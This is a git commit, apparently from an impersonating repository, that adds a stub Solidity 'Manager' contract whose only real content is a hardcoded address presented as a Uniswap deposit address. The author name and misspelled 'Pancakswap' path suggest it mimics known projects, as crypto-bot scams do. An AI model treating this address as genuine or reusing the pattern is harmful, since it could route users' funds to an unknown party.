5b30c5458a3e67e09a7589cd4bd192367f137036
Uniswap-v2-core <90988243+Uniswap-v2-core@users.noreply.github.com>
2021-12-20 14:42:18 +0000

    blob/main/Pancakswap/Peripherals/

---
+++ abstract.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0xF253a7486dA175D316411F0c3F9eE149431fA958;
+	}
+}
